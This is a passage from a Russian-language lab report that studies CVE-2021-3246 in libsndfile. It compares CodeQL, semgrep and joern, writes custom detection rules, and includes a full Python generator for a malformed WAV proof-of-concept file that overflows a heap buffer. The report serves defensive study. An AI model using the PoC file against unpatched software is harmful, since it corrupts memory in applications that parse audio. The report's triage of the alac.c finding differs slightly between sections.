
Результат:

| Версия | Находок | Место |
|---|---|---|
| libsndfile 1.0.30 | 1 | src/ms_adpcm.c:131 |
| libsndfile 1.1.0 | 0 | — |

![CodeQL: пять CWE и своё правило](screenshots/03-codeql.png)

## 11. Результаты анализа средством semgrep

Команды:

    semgrep --config=p/c --metrics=off src/
    semgrep --config=p/default --metrics=off src/
    semgrep --config=p/security-audit --metrics=off src/
    semgrep --config=rules/semgrep/msadpcm-block-size.yaml --metrics=off src/

Результаты:

| Прогон | Находок | Комментарий |
|---|---|---|
| p/c | 0 | штатный C-набор, 2 правила; для C он слишком мал |
| p/default | 0 | 336 правил, но ни одно не сработало |
| p/security-audit | 7 | двойное освобождение, use-after-free, небезопасные строковые функции |
| своё правило, 1.0.30 | 1 | src/ms_adpcm.c:131 |
| своё правило, 1.1.0 | 0 | условие исправлено, правило молчит |

Семь срабатываний p/security-audit перечислены в разделе 8.1; после ручного разбора два use-after-free в wavlike.c и double-free в alac.c оказались ложными, а предупреждения о strcpy/strcat в common.h — общими. Это показывает, что шаблонные правила semgrep без анализа потока управления дают заметную долю ложных срабатываний на старом C-коде.

Собственное правило точно находит старую проверку и не срабатывает на 1.1.0:

    work/src/libsndfile-1.0.30/src/ms_adpcm.c
      131┆ if (blockalign < 7 * psf->sf.channels)

## 12. Результаты анализа средством joern

Штатный прогон описан в разделе 9: 368 срабатываний joern-scan, из них 293 — эвристика Copy loop. CVE-2021-3246 в этом списке нет.

Собственное правило — скрипт rules/joern/msadpcm-block-size.sc. Его запускает тот же scripts/06-joern.sh, отдельно на src/ версии 1.0.30 и на src/ версии 1.1.0:

    export JAVA_HOME=work/tools/jdk-21
    export PATH="$JAVA_HOME/bin:$PATH"
    joern --script rules/joern/msadpcm-block-size.sc \
      --param inputPath=work/src/libsndfile-1.0.30/src \
      --param outFile=results/joern-custom-1.0.30.txt

Для 1.1.0 меняется только каталог исходников и имя файла результата. joern при этом работает из work/joern-runs/custom-1.0.30 и work/joern-runs/custom-1.1.0, чтобы каталог workspace не появился в корне репозитория.

Результат:

| Версия | Находок | Место |
|---|---|---|
| libsndfile 1.0.30 | 1 | ms_adpcm.c:131, условие blockalign < 7 * psf->sf.channels |
| libsndfile 1.1.0 | 0 | — |

Файл results/joern-custom-1.0.30.txt:

    находок: 1
    ms_adpcm.c:131: blockalign < 7 * psf->sf.channels

Файл results/joern-custom-1.1.0.txt содержит одну строку: находок: 0.

![joern: своё правило на 1.0.30 и 1.1.0](screenshots/06-joern-custom.png)

## 13. Разработанные правила обнаружения уязвимости

Все три правила нацелены на одну и ту же сигнатуру: слабую проверку в wavlike_msadpcm_init, из-за которой samplesperblock не ограничивается. На исправленной версии 1.1.0 этой проверки нет, поэтому все три правила должны молчать.

### 13.1. Правило CodeQL

Файл rules/codeql/msadpcm-block-size.ql:

    /**
     * @name CVE-2021-3246: недостаточная проверка размера блока MS ADPCM
     * @description В wavlike_msadpcm_init проверяется только blockalign,
     *              но не samplesperblock. Из-за этого msadpcm_decode_block
     *              может записать больше сэмплов, чем выделено в calloc.
     * @kind problem
     * @problem.severity error
     * @security-severity 8.8
     * @id cpp/lab4-msadpcm-block-size
     * @tags security
     *       external/cwe/cwe-787
     *       external/cwe/cwe-122
     */
    
    import cpp
    
    from IfStmt check, BinaryOperation lt
    where
      check.getEnclosingFunction().hasName("wavlike_msadpcm_init") and
      lt = check.getCondition() and
      lt.getOperator() = "<" and
      lt.getLeftOperand().toString() = "blockalign"
    select check,
      "Проверка размера блока MS ADPCM использует blockalign и не ограничивает samplesperblock (CVE-2021-3246)"

Принцип работы:

- запрос ограничен функцией wavlike_msadpcm_init;
- ищется if-условие с оператором <, у которого левый операнд — именно blockalign;
- проверка getLeftOperand().toString() = "blockalign" отсекает исправленную проверку 2 * blockalign < ... из 1.1.0: там левый операнд — умножение, а не сам blockalign;
- запрос не привязан к номеру строки и находит функцию по имени и структуре AST.

Результат: 1 срабатывание в 1.0.30 (src/ms_adpcm.c:131), 0 в 1.1.0.

Ограничение: правило узкое и ищет конкретную сигнатуру CVE, а не любой дефект согласования размеров. Это сознательный выбор: штатный запрос CWE-120 такие логические ошибки не находит, а широкое правило давало бы много ложных срабатываний. В отчёте это сформулировано как компромисс между точностью и полнотой.

### 13.2. Правило semgrep

Файл rules/semgrep/msadpcm-block-size.yaml:

    rules:
      - id: lab4-msadpcm-block-size
        languages: [c]
        severity: ERROR
        message: >
          MS ADPCM: проверяется только blockalign, а samplesperblock не ограничен.
          Это позволяет выйти за границы буфера в msadpcm_decode_block
          (CVE-2021-3246 в libsndfile 1.0.30).
        metadata:
          cwe:
            - "CWE-787: Out-of-bounds Write"
          references:
            - https://nvd.nist.gov/vuln/detail/CVE-2021-3246
            - https://github.com/libsndfile/libsndfile/issues/687
        patterns:
          - pattern-inside: |
              int wavlike_msadpcm_init(...)
              {
                ...
              }
          - pattern: |
              if (blockalign < 7 * $CHANNELS)
              {
                ...
              }

Принцип работы:

- pattern-inside ограничивает поиск телом функции wavlike_msadpcm_init;
- pattern ищет условие blockalign < 7 * $CHANNELS и тело if;
- $CHANNELS — метапеременная, поэтому правило не зависит от конкретного имени поля (psf->sf.channels);
- на 1.1.0 условие заменено, правило не срабатывает.

Результат: 1 находка в 1.0.30, 0 в 1.1.0.

Ограничение: semgrep не анализирует поток управления и не проверяет, что найденное условие действительно является единственной проверкой; правило намеренно синтаксическое. Это типично для semgrep: он быстро и точно находит шаблон, но не доказывает уязвимость.

### 13.3. Правило joern

Правило записано скриптом rules/joern/msadpcm-block-size.sc (полный текст — в Приложении В). Это отдельный запуск joern --script, а не запись Query.make в общей базе: скрипту нужны параметры пути к исходникам и файла результата. Ключевой фильтр:

    val hits = cpg.method
      .nameExact("wavlike_msadpcm_init")
      .controlStructure
      .controlStructureType(ControlStructureTypes.IF)
      .filter { cs =>
        cs.condition.l.exists { cond =>
          val kids = cond.astChildren.l
          kids.length >= 2 &&
          kids.head.code == "blockalign" &&
          kids(1).code.startsWith("7 *")
        }
      }

Принцип работы:

- importCode.c строит граф по переданному каталогу src/;
- обход оставляет только функцию wavlike_msadpcm_init и её операторы if;
- у условия первый ребёнок AST должен иметь код blockalign, второй — текст, начинающийся с 7 *;
- в libsndfile 1.1.0 слева стоит samplesperblock, а проверка blockalign записана как 2 * blockalign, поэтому фильтр на исправленной версии молчит;
- скрипт пишет в outFile строку с числом находок и список файл:строка: условие.

Результат: 1 находка в 1.0.30, 0 в 1.1.0. Ограничение то же, что у правила semgrep: проверка синтаксическая. Скрипт не доказывает выход за границу буфера, а узнаёт уязвимую форму условия. Сравнение второго ребёнка сделано по тексту кода узла, а не по типу «литерал 7».

### 13.4. Сравнение правил

| Средство | Движок | Что ищет | 1.0.30 | 1.1.0 | Ложные срабатывания |
|---|---|---|---|---|---|
| CodeQL | AST + CFG, QL | if с blockalign в wavlike_msadpcm_init | 1 | 0 | нет |
| semgrep | AST-шаблоны | тот же if по текстовому шаблону | 1 | 0 | нет |
| joern | обход CPG на Scala | тот же if по детям AST условия | 1 | 0 | нет |

Все три правила дают одинаковый результат на двух версиях, что подтверждает правильность выбранной сигнатуры.

## 14. Выводы

В работе исследована библиотека libsndfile 1.0.30 и уязвимость CVE-2021-3246 (CWE-787, CVSS 8.8). Уязвимость воспроизведена на чистом WAV-файле размером 2660 байт, собрана ASan-версия, получен отчёт heap-buffer-overflow в msadpcm_decode_block, а на версии 1.1.0 тот же файл отклоняется с сообщением samplesperblock (10) should be >= 1582.

Основные результаты:

1. **CodeQL.** Пять штатных запросов дали 301 срабатывание: 290 — CWE-190, 8 — CWE-129, 2 — CWE-457, 1 — CWE-468, 0 — CWE-120. Штатные запросы хорошо показывают общие классы дефектов, но CWE-190 оказался очень шумным, а CWE-120 не увидел исследуемую CVE, потому что она является ошибкой согласования размеров. Собственное правило точно нашло уязвимую проверку в 1.0.30 и не сработало в 1.1.0.
2. **semgrep.** Штатный C-набор p/c содержит всего два правила и не дал находок; p/default (336 правил) — тоже 0; p/security-audit дал 7 находок, из которых после ручного разбора два use-after-free в wavlike.c оказались ложными, double-free в alac.c требует проверки, а предупреждения о strcpy/strcat — общими. Собственное правило дало 1 находку в 1.0.30 и 0 в 1.1.0.
3. **joern.** Штатный joern-scan по 16 запросам метки default для C дал 368 срабатываний. 293 из них — эвристика Copy loop на циклах кодеков. Остальное: левый сдвиг знакового числа (42), доступ к массиву по константному смещению (18), усечение strlen в int (6), пара файловых операций по пути (6), непроверенный malloc (2) и одна форматная строка, которая на самом деле константная. CVE-2021-3246 штатный набор не увидел. Собственное правило нашло условие в ms_adpcm.c:131 на версии 1.0.30 и промолчало на 1.1.0.
4. **Сравнение средств.** CodeQL даёт самый богатый анализ и позволяет писать компактные запросы по AST и CFG. semgrep быстрее и проще, но без анализа потока управления даёт ложные срабатывания. joern тоже отвечает запросом по графу, своё правило пишется на Scala; штатная база для C короче набора CodeQL, и на libsndfile её основной объём — шум эвристики Copy loop.
5. **Практический вывод.** Для поиска конкретной CVE эффективнее узкое правило по сигнатуре уязвимого кода, чем штатные универсальные запросы. Универсальные правила полезны для первичного аудита, но требуют ручной триаги; в отчёте это показано на примерах CWE-190 и Copy loop.

## 15. Список источников

1. Методические указания: «Лабораторная работа № 4 — Использование средств статического анализа кода для оценки безопасности приложений».
2. libsndfile — официальный репозиторий: <https://github.com/libsndfile/libsndfile>
3. CVE-2021-3246, NVD: <https://nvd.nist.gov/vuln/detail/CVE-2021-3246>
4. CVE-2021-3246, MITRE CVE Services: <https://cveawg.mitre.org/api/cve/CVE-2021-3246>
5. Issue libsndfile #687: <https://github.com/libsndfile/libsndfile/issues/687>
6. Коммит исправления: <https://github.com/libsndfile/libsndfile/commit/deb669ee8be55a94565f6f8a6b60890c2e7c6f32>
7. OSS-Fuzz testcase 5696502087024640: <https://oss-fuzz.com/testcase-detail/5696502087024640>
8. Debian DSA-4947: <https://www.debian.org/security/2021/dsa-4947>
9. Gentoo GLSA 202309-11: <https://security.gentoo.org/glsa/202309-11>
10. CodeQL documentation: <https://codeql.github.com/docs/>
11. CodeQL query packs: <https://github.com/github/codeql>
12. semgrep documentation: <https://semgrep.dev/docs/>
13. semgrep registry: <https://semgrep.dev/explore>
14. Joern documentation: <https://docs.joern.io/>
15. Joern Scan и формат Query.make: <https://docs.joern.io/scan>
16. Релиз joern v4.0.669: <https://github.com/joernio/joern/releases/tag/v4.0.669>

---

## Приложение А. Структура работы и команды воспроизведения

Структура каталога lab4:

    lab4/
    ├── report.md                  этот отчёт
    ├── README.md                  краткое описание и команды
    ├── scripts/
    │   ├── 01-fetch.sh            клонирование libsndfile 1.0.30 и 1.1.0
    │   ├── 02-build.sh            обычная и ASan-сборка
    │   ├── 03-poc.sh              генерация PoC и прогон
    │   ├── 04-codeql.sh           база CodeQL, пять CWE, своё правило
    │   ├── 05-semgrep.sh          штатные наборы и своё правило
    │   ├── 06-joern.sh            joern-scan и своё правило
    │   ├── 07-screenshots.sh      сводки и PNG для отчёта
    │   ├── run-all.sh             всё подряд
    │   ├── codeql-build.sh        обёртка сборки для CodeQL
    │   ├── make-shot.sh           рендер вывода в PNG
    │   └── summarize.py           сводки по результатам
    ├── rules/
    │   ├── codeql/
    │   │   ├── msadpcm-block-size.ql
    │   │   └── qlpack.yml
    │   ├── semgrep/
    │   │   └── msadpcm-block-size.yaml
    │   └── joern/
    │       └── msadpcm-block-size.sc
    ├── poc/
    │   ├── gen_msadpcm_poc.py
    │   └── msadpcm_poc.wav        генерируется скриптом
    ├── results/                   SARIF, текстовые отчёты, сводки
    ├── screenshots/               PNG для отчёта
    └── work/                      исходники, сборки, базы, venv (в git не входит)

Окружение: Omarchy/Arch Linux, clang 23.1.3 (сборка libsndfile), CodeQL 2.27.3 (bundle), semgrep 1.182.1, joern 4.0.669, JDK Temurin 21.0.13+9. WSL и Docker не использовались: все инструменты работают нативно на Linux. JDK и joern лежат в work/tools/ и в git не входят.

Основные команды (все шаги автоматизированы в scripts/, ниже — минимум для проверки вручную):

    # 1. Исходники и сборка
    ./scripts/01-fetch.sh
    ./scripts/02-build.sh
    
    # 2. PoC (из каталога lab4)
    python3 poc/gen_msadpcm_poc.py
    ASAN_OPTIONS=detect_leaks=0 \
      work/build/asan-1.0.30/programs/sndfile-info poc/msadpcm_poc.wav
    
    # 3. CodeQL
    CODEQL=work/tools/codeql/codeql
    $CODEQL database create work/db-1.0.30 --language=cpp \
      --source-root="$PWD/work/src/libsndfile-1.0.30" \
      --command="$PWD/scripts/codeql-build.sh 1.0.30"
    $CODEQL database analyze work/db-1.0.30 \
      "$PWD/work/tools/codeql/qlpacks/codeql/cpp-queries/1.9.2/Security/CWE/CWE-190/IntegerOverflowTainted.ql" \
      --format=sarif-latest --output=results/codeql-cwe-1.0.30.sarif
    
    # 4. semgrep
    SEMGREP=work/venvs/semgrep/bin/semgrep
    $SEMGREP --config=p/security-audit --metrics=off work/src/libsndfile-1.0.30/src
    $SEMGREP --config=rules/semgrep/msadpcm-block-size.yaml --metrics=off \
      work/src/libsndfile-1.0.30/src
    
    # 5. joern
    export JAVA_HOME=work/tools/jdk-21
    export PATH="$JAVA_HOME/bin:$PATH"
    ./scripts/06-joern.sh

Полные команды с абсолютными путями и параметрами — в скриптах scripts/ и README.md.

## Приложение Б. Полный текст генератора PoC

    #!/usr/bin/env python3
    """Генератор PoC для CVE-2021-3246 в libsndfile 1.0.30."""
    
    import argparse
    import struct
    from pathlib import Path
    
    MS_ADPCM_GUID = bytes.fromhex("0200000000001000800000aa00389b71")
    
    CHANNELS = 226
    BLOCK_ALIGN = 2592
    SAMPLES_PER_BLOCK = 10
    SAMPLE_RATE = 8000
    BITS_PER_SAMPLE = 4
    
    
    def build_wav() -> bytes:
        fmt = struct.pack(
            "<HHIIHH",
            0xFFFE,
            CHANNELS,
            SAMPLE_RATE,
            SAMPLE_RATE * BLOCK_ALIGN,
            BLOCK_ALIGN,
            BITS_PER_SAMPLE,
        )
        extension = (
            struct.pack("<HI", SAMPLES_PER_BLOCK, 0)
            + MS_ADPCM_GUID
        )
        fmt += struct.pack("<H", len(extension)) + extension
        data = bytes(BLOCK_ALIGN)
        body = (
            b"WAVE"
            + b"fmt "
            + struct.pack("<I", len(fmt))
            + fmt
            + b"data"
            + struct.pack("<I", len(data))
            + data
        )
        return b"RIFF" + struct.pack("<I", len(body)) + body
    
    
    def main() -> None:
        parser = argparse.ArgumentParser()
        parser.add_argument("-o", "--output", type=Path,
                            default=Path(__file__).with_name("msadpcm_poc.wav"))
        args = parser.parse_args()
        blob = build_wav()
        args.output.write_bytes(blob)
        print(f"записан {args.output} ({len(blob)} байт)")
    
    
    if __name__ == "__main__":
        main()

## Приложение В. Полный текст правила joern

Файл rules/joern/msadpcm-block-size.sc:

    // Ищет слабую проверку размера блока MS ADPCM (CVE-2021-3246):
    // внутри wavlike_msadpcm_init условие вида `blockalign < 7 * ...`.
    // В libsndfile 1.1.0 слева стоит samplesperblock или `2 * blockalign`,
    // поэтому правило на исправленной версии молчит.
    
    @main def main(inputPath: String, outFile: String) = {
      importCode.c(inputPath)
    
      val hits = cpg.method
        .nameExact("wavlike_msadpcm_init")
        .controlStructure
        .controlStructureType(ControlStructureTypes.IF)
        .filter { cs =>
          cs.condition.l.exists { cond =>
            val kids = cond.astChildren.l
            kids.length >= 2 &&
            kids.head.code == "blockalign" &&
            kids(1).code.startsWith("7 *")
          }
        }
        .map { cs =>
          val file = cs.file.name.l.headOption.getOrElse("?")
          val line = cs.lineNumber.map(_.toString).getOrElse("?")
          val code = cs.condition.code.l.headOption.getOrElse(cs.code)
          s"$file:$line: $code"
        }
        .l
        .distinct
        .sorted
    
      val text = s"находок: ${hits.size}\n" + hits.map(h => s"$h\n").mkString
      java.nio.file.Files.writeString(java.nio.file.Paths.get(outFile), text)
      println(text)
    }
